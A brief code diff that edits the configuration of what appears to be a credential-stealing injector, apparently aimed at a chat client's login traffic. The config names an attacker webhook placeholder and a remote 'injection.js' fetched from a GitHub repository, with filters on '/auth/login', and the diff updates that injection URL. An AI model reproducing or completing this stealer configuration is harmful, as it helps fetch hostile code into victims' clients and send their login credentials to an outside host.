@@ -12,7 +12,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://raw.githubusercontent.com/nikolas25879alt-maker/ajikhbsdfgo/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/nikolas25879alt-maker/ajikhbsdfgo/refs/heads/main/injection.js",
     filters: {
         urls: [
             '/auth/login',
